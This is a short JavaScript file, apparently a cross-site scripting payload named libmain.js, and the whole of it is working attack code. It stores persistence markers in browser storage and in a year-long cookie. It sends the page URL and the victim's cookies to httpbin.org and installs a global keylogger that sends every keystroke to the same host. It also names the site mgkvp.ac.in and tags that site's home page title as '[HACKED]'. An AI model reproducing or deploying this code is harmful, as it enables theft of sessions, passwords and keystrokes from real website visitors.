// ULTRA PERSISTENT XSS - MULTI-METHOD
(function(){
    console.log('🔥 libmain.js → Multi-persistence active!');
    
    // Method 1: LocalStorage (Most Reliable)
    localStorage.setItem('xss_persist', '1');
    
    // Method 2: SessionStorage  
    sessionStorage.setItem('xss_active', '1');
    
    // Method 3: Cookie (Fallback)
    document.cookie = 'xss=1;path=/;max-age=31536000';
    
    // EXECUTE EVERYWHERE
    if(localStorage.getItem('xss_persist') === '1'){
        console.log('🌐 PERMANENT XSS on:', location.href);
        
        // Beacon
        new Image().src='https://httpbin.org/image/png?xss='+btoa('URL:'+location.href+'|Cookies:'+document.cookie);
        
        // KEYLOGGER UNIVERSAL
        if(!window.xss_keylogger){
            window.xss_keylogger = true;
            document.addEventListener('keydown', function(e){
                new Image().src='https://httpbin.org/image/png?key='+btoa(e.key+'|'+location.pathname);
            });
            console.log('⌨️ KEYLOGGER DEPLOYED GLOBALLY');
        }
        
        // HOME PAGE MARKER
        if(location.host === 'mgkvp.ac.in' && location.pathname === '/'){
            console.log('🏠 HOME PAGE COMPROMISED!');
            document.title += ' [HACKED]';
        }
    }
})();
